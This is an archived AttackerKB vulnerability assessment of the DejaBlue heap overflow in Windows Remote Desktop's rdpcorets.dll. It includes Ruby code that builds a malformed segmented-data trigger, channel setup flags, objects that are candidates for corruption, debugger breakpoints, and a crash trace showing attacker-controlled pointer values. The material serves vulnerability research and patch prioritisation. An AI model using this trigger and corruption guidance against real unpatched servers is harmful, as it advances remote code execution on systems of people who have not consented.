---
title: DejaBlue, RDP Heap Overflow
author: zeroSteiner
score: 15
topic_attacker_value: 4.714285714285714
topic_exploitability: 3
topic_disclosure_date: '2019-08-14T21:15:00'
created: '2019-11-14T17:12:43.129095'
revision_date: '2020-03-12T20:08:29.696979'
assessment_id: 2bb96155-0908-470d-8fcf-b477c2461851
topic_id: 3c6d4a84-b8ee-47a2-a1e9-388f5f32ad27
topic_short_id: 71QrpupdZO
topic_slug: dejablue-rdp-heap-overflow
akb_topic_url: https://attackerkb.com/topics/71QrpupdZO/dejablue-rdp-heap-overflow
akb_assessment_url: https://attackerkb.com/topics/71QrpupdZO/dejablue-rdp-heap-overflow#2bb96155-0908-470d-8fcf-b477c2461851
author_ratings:
  attacker-value: 5
  confidence-in-ratings: 3
  effort-to-develop-exploit: 5
  exploitability: 3
  mitigation-strength: 5
  reliability: 3
  stability: 3
  urgent-to-patch: 5
  used-successfully: 1
---

# DejaBlue, RDP Heap Overflow

*Assessment by zeroSteiner, archived from [AttackerKB](https://attackerkb.com/topics/71QrpupdZO/dejablue-rdp-heap-overflow#2bb96155-0908-470d-8fcf-b477c2461851).*

---

Analysis performed using rdpcorets.dll from Windows 8.1 x64 (sha256: `c9d1f3c0a9459c67e96115041d622808decc31f9a9b7e3b4806421557f09cda1`)

The vulnerability exists within `rdpcorets.dll` loaded in the process `svchost.exe -k NetworkService` running as `NT AUTHORITY\NETWORK SERVICE`. This is started by the service "Remote Desktop Services".

The bug is triggered by sending a specially crafted request over the `drdynvc` channel which must be setup. Use the flags `RDPConstants::CHAN_INITIALIZED | RDPConstants::CHAN_ENCRYPT_RDP` when initializing it.

After the DynVC channel has been initialized, the overflow is triggered by sending segmented data (`DYNVC_DATA_COMPRESSED`) frame, see MS-RDPEDYC:25 for details. Note that segmented data is different than a data segment.

The compressed frame includes a payload as defined in MS-RDPEGFX section 2.2.5. The below snippet can be used to build a compatible data segment. The RDP segmented data field contains a length field which is the root cause of the vulnerability. 

```ruby
  # see [MS-RDPEGFX] section 2.2.5.2
  def build_rdp_data_segment(data)
    # RDP_DATA_SEGMENT
    encoded = [data.length + 1].pack("L<")
    encoded << "\x04"
    encoded << data
  end

  def build_trigger
      # see [MS-RDPEGFX] section 2.2.5
      rdp_data_segment = build_rdp_data_segment(("\x41" * 0x50) + [0xdead1337dead1337].pack('Q'))
      rdp_segmented_data = [0xe1, 1, 0x40 - 0x2000].pack("CS<l<") + rdp_data_segment
  end
```

An object needs to be created and corrupted, potential candidates are below.

| Object Name                  | Breakpoint Address | Size  | Can Create?                  |
| ---------------------------- | ------------------ | ----- | ---------------------------- |
| CRdpDynVCMgr ChannelInternal | `rdpcorets+c8e03`  | 0x138 | Static number can be created |
| DecompressRdp8               | `rdpcorets+16274a` | 0x68  |                              |
| DecompressUnchopper          | `rdpcorets+12dd1a` | 0x48  |                              |

## Relevant Breakpoints
* `rdpcorets+f67dc  ".printf \"CRdpDynVCMgr::HandleIncomingDvcData\\n\"; db rdx"`
* `rdpcorets+1dcc89 ".printf \"memcpy(dst=%N, src=%N, size=%N)\\n\", rcx, rdx, r8; g`
    * `memcpy` call that copies the buffer to the target and overflows it
* `rdpcorets+c9538 ".printf \"CRdpDynVC::Initialize\\n\"; g"`
    * Watch object creation instances
* `msvcrt+1e00 ".printf \"operator new(size=%N)\", rcx; gu; .printf \" = %N\\n\", rax; g"`

## Read Access Violation
The following stack trace was taken during a RAV after having corrupted an object using the target memcpy call.

```
0:001> g
(138c.13b4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
rdpcorets+0xd9d36:
00007fff`a5b79d36 49895014        mov     qword ptr [r8+14h],rdx ds:41414141`41414155=????????????????
0:033> k
Child-SP          RetAddr           Call Site
00000050`beaaf478 00007fff`a5b79c7f rdpcorets+0xd9d36
00000050`beaaf480 00007fff`a5b7c3bf rdpcorets+0xd9c7f
00000050`beaaf4c0 00007fff`a5b91190 rdpcorets+0xdc3bf
00000050`beaaf5f0 00007fff`a5b90cb1 rdpcorets+0xf1190
00000050`beaaf690 00007fff`a5bf2893 rdpcorets+0xf0cb1
00000050`beaaf720 00007fff`c9ed13d2 rdpcorets!DllGetClassObject+0x75b3
00000050`beaaf7e0 00007fff`caf654f4 KERNEL32!BaseThreadInitThunk+0x22
00000050`beaaf810 00000000`00000000 ntdll!RtlUserThreadStart+0x34
0:033> u
rdpcorets+0xd9d36:
00007fff`a5b79d36 49895014        mov     qword ptr [r8+14h],rdx
00007fff`a5b79d3a 498d5028        lea     rdx,[r8+28h]
00007fff`a5b79d3e 41c7401038000000 mov     dword ptr [r8+10h],38h
00007fff`a5b79d46 4d89481c        mov     qword ptr [r8+1Ch],r9
00007fff`a5b79d4a 45894824        mov     dword ptr [r8+24h],r9d
00007fff`a5b79d4e 8d0c8510000000  lea     ecx,[rax*4+10h]
00007fff`a5b79d55 4803ca          add     rcx,rdx
00007fff`a5b79d58 44890a          mov     dword ptr [rdx],r9d
0:033> r
rax=0000000000000000 rbx=00007fffa5b79d10 rcx=00000050bf0c1940
rdx=0000000000000001 rsi=00000050bdcba9a0 rdi=00000050bf0c1940
rip=00007fffa5b79d36 rsp=00000050beaaf478 rbp=00000050bf0c7450
 r8=4141414141414141  r9=0000000000000000 r10=0000000000000007
r11=00000050beaaf4b8 r12=00000050bf0c1f40 r13=00000050bf0c23c0
r14=0000000000000000 r15=00000050bdccfdc0
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
rdpcorets+0xd9d36:
00007fff`a5b79d36 49895014        mov     qword ptr [r8+14h],rdx ds:41414141`41414155=????????????????
```
